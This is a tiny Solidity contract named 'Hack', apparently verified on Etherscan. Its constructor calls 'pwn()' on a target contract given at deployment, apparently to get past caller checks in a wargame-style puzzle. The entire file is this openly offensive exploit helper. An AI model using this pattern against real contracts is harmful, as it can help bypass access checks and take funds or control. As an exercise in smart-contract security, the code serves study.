/**
 *Submitted for verification at Etherscan.io on 2023-01-08
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

error Hack__CallFailed();

contract Hack {
    constructor(address contractAddress) {
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        if (!success) {
            revert Hack__CallFailed();
        }
    }
}